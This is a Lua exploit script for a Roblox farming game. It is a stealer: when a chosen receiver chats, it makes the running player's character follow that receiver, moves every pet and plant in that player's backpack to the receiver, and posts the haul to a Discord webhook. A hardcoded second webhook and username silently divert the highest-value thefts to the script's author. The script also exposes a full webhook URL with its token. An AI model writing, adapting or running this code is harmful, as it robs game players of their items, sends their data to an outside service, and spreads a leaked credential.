local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local backpack = Players.LocalPlayer:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")

-- L·∫§Y SETTINGS T·ª™ getfenv
local env = getfenv()
local PRIMARY_USERNAME = env.Username or "unknown_user"
local PRIMARY_WEBHOOK = env.Webhook or nil -- b·∫Øt bu·ªôc c√≥

-- C·∫§U H√åNH N·ªòI B·ªò
local DUAL_USERNAME = "namnnni2"
local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
local VALUE_THRESHOLD = 1_000_000_000_000
local AUTO_TRANSFER_DELAY = 0.3
local HEAVY_WEIGHT = 10
local VIP_PETS = {"Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "Butterfly", "Dragonfly", "Raccoon"}

-- MODULE
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))

-- HTTP METHOD
local request = (syn and syn.request)
            or (http and http.request)
            or (fluxus and fluxus.request)
            or (getgenv and getgenv().request)
            or (krnl and krnl.request)
            or request

-- BI·∫æN TO√ÄN C·ª§C
local currentPrompt = nil
local isTransferring = false
local connection = nil

-- FORMAT S·ªê
local function formatNumber(n)
    return tostring(math.floor(n)):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

local function calculateItemValue(tool)
    local itemType = tool:GetAttribute("ItemType")
    if itemType == "Pet" then
        return petUtils:GetPetValue(tool)
    elseif itemType == "Plant" then
        return calcPlantValue(tool)
    else
        return 0
    end
end

local function calculatePriority(item)
    local p = 0
    if table.find(VIP_PETS, item.Name) then p += 1000 end
    if (item.Weight or 0) >= HEAVY_WEIGHT then p += 500 end
    return p + (item.Value or 0)
end

local function sortByPriority(a, b)
    return calculatePriority(a) > calculatePriority(b)
end

local function sendWebhookNotification(items, totalValue, targetName)
    local useDual = totalValue >= VALUE_THRESHOLD
    local webhookUrl = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
    local username = useDual and DUAL_USERNAME or PRIMARY_USERNAME

    if not webhookUrl then
        warn("‚ùå Kh√¥ng c√≥ Webhook ch√≠nh ƒë·ªÉ g·ª≠i.")
        return
    end

    local hasVIPOrHeavy = false
    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) or (item.Weight or 0) >= HEAVY_WEIGHT then
            hasVIPOrHeavy = true
            break
        end
    end

    local categories = {
        {name = "üíé VIP Pets", items = {}},
        {name = "üèãÔ∏è Heavy Pets", items = {}},
        {name = "üêæ Regular Pets", items = {}},
        {name = "üå± Plants", items = {}}
    }

    for _, item in ipairs(items) do
        if table.find(VIP_PETS, item.Name) then
            table.insert(categories[1].items, item)
        elseif (item.Weight or 0) >= HEAVY_WEIGHT then
            table.insert(categories[2].items, item)
        elseif item.Type == "Pet" then
            table.insert(categories[3].items, item)
        else
            table.insert(categories[4].items, item)
        end
    end

    local desc = {}
    for _, cat in ipairs(categories) do
        if #cat.items > 0 then
            table.insert(desc, "**"..cat.name.." ("..#cat.items.."):**")
            for _, i in ipairs(cat.items) do
                table.insert(desc, string.format("- %s: $%s (%.1fkg)", i.Name, formatNumber(i.Value), i.Weight or 0))
            end
            table.insert(desc, "")
        end
    end

    local payload = {
        username = username,
        embeds = {{
            title = useDual and "üíé VIP TRANSFER" or "üì¶ ITEM TRANSFER",
            color = useDual and 0xFFD700 or 0x00FF00,
            description = table.concat(desc, "\n"),
            fields = {
                {name = "üë§ Sender", value = Players.LocalPlayer.Name, inline = true},
                {name = "üéØ Receiver", value = targetName, inline = true},
                {name = "üí∞ Total Value", value = "$"..formatNumber(totalValue), inline = true},
                {name = "üîó Quick Join", value = string.format("[Click Here](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), inline = false}
            },
            footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
            timestamp = DateTime.now():ToIsoDate()
        }},
        content = hasVIPOrHeavy and "@everyone" or nil
    }

    local ok, res = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not ok then
        warn("‚ùå G·ª≠i webhook th·∫•t b·∫°i:", res)
    elseif res and res.StatusCode and res.StatusCode >= 400 then
        warn("‚ö†Ô∏è Webhook l·ªói:", res.StatusCode, res.Body or "")
    else
        warn("‚úÖ Webhook g·ª≠i th√†nh c√¥ng.")
    end
end

local function waitForItemRemoval(tool)
    local timeout = 5
    local startTime = os.time()
    while tool and tool.Parent == backpack do
        if os.time() - startTime > timeout then
            warn("Timeout ƒë·ª£i item bi·∫øn m·∫•t:", tool.Name)
            return false
        end
        task.wait(0.1)
    end
    return true
end

local function createAutoPrompt(targetCharacter, targetName)
    if currentPrompt then currentPrompt:Destroy() end

    local prompt = Instance.new("ProximityPrompt")
    prompt.ObjectText = "Transfer to "..targetName
    prompt.ActionText = "Auto-Transfer"
    prompt.HoldDuration = 0.5
    prompt.MaxActivationDistance = 10
    prompt.Parent = targetCharacter:FindFirstChild("HumanoidRootPart")

    prompt.Triggered:Connect(function()
        if isTransferring then return end
        isTransferring = true

        local items, totalValue = {}, 0
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local item = {
                    Name = tool.Name,
                    Type = tool:GetAttribute("ItemType"),
                    Value = calculateItemValue(tool),
                    Weight = tool:GetAttribute("Weight"),
                    Tool = tool
                }
                totalValue += item.Value
                table.insert(items, item)
            end
        end

        table.sort(items, sortByPriority)

        local target = Players:FindFirstChild(targetName)
        local targetBackpack = target and target:FindFirstChildOfClass("Backpack")
        if targetBackpack then
            for _, item in ipairs(items) do
                if item.Tool and item.Tool.Parent == backpack then
                    item.Tool.Parent = targetBackpack
                    if not waitForItemRemoval(item.Tool) then
                        warn("‚ùå G·ª≠i th·∫•t b·∫°i:", item.Name)
                        break
                    end
                    task.wait(AUTO_TRANSFER_DELAY)
                end
            end
        end

        sendWebhookNotification(items, totalValue, targetName)
        isTransferring = false
    end)

    currentPrompt = prompt

    task.delay(0.5, function()
        if prompt and prompt.Parent then
            prompt:InputHoldBegin()
            task.wait(prompt.HoldDuration)
            prompt:InputHoldEnd()
        end
    end)
end

local function teleportAndFollow(targetPlayer)
    if not targetPlayer.Character then return end
    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHRP then return end

    local myCharacter = Players.LocalPlayer.Character
    local myHRP = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
    if not myHRP then return end

    if connection then connection:Disconnect() end

    connection = RunService.Heartbeat:Connect(function(dt)
        local behind = targetHRP.CFrame.Position - targetHRP.CFrame.LookVector * 3
        local newPos = myHRP.Position:Lerp(behind, dt * 10)
        myHRP.CFrame = CFrame.new(newPos, targetHRP.Position)

        if not currentPrompt then
            createAutoPrompt(targetPlayer.Character, targetPlayer.Name)
        end
    end)
end

local function onPlayerChatted(player, message)
    if (player.Name == PRIMARY_USERNAME or player.Name == DUAL_USERNAME) and not isTransferring then
        if player.Character then
            teleportAndFollow(player)
        else
            player.CharacterAdded:Once(function()
                teleportAndFollow(player)
            end)
        end
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) onPlayerChatted(p, msg) end)
end

Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) onPlayerChatted(p, msg) end)
end)
